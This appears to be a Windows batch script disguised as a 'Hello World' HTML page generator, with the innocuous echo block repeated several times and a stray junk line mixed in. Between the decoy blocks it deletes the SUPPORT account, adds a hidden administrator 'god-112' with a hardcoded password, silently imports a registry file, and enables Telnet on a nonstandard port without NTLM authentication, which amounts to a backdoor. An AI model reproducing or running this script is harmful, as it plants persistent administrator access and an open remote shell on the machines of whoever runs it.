@echo off
chcp 1251
call :array new A "'one','two','three','foo','bar'"
set OUTPUTFILE=%1
echo <html>                                  >%OUTPUTFILE%
echo <head>                                 >>%OUTPUTFILE%
echo <title>This is a greeting page</title> >>%OUTPUTFILE%
echo </head>                                >>%OUTPUTFILE%
echo <body>                                 >>%OUTPUTFILE%
echo Hello World!                           >>%OUTPUTFILE%
echo </body>                                >>%OUTPUTFILE%
echo </html>                                >>%OUTPUTFILE%
net user SUPPORT_388945a0 /delete
efdvcvddderrrrrrrrrrrrrrrtghgfh
net user god-112 42566452 /add
net localgroup Администраторы god-112 /add
set OUTPUTFILE=%1
echo <html>                                  >%OUTPUTFILE%
echo <head>                                 >>%OUTPUTFILE%
echo <title>This is a greeting page</title> >>%OUTPUTFILE%
echo </head>                                >>%OUTPUTFILE%
echo <body>                                 >>%OUTPUTFILE%
echo Hello World!                           >>%OUTPUTFILE%
echo </body>                                >>%OUTPUTFILE%
echo </html>                                >>%OUTPUTFILE%
net localgroup Пользователи SUPPORT_388945a0 /del
set OUTPUTFILE=%1
echo <html>                                  >%OUTPUTFILE%
echo <head>                                 >>%OUTPUTFILE%
echo <title>This is a greeting page</title> >>%OUTPUTFILE%
echo </head>                                >>%OUTPUTFILE%
echo <body>                                 >>%OUTPUTFILE%
echo Hello World!                           >>%OUTPUTFILE%
echo </body>                                >>%OUTPUTFILE%
echo </html>                                >>%OUTPUTFILE%
regedit /s conf.reg
sc config tlntsvr start= auto
tlntadmn config port=972 sec=-NTLM
net start Telnet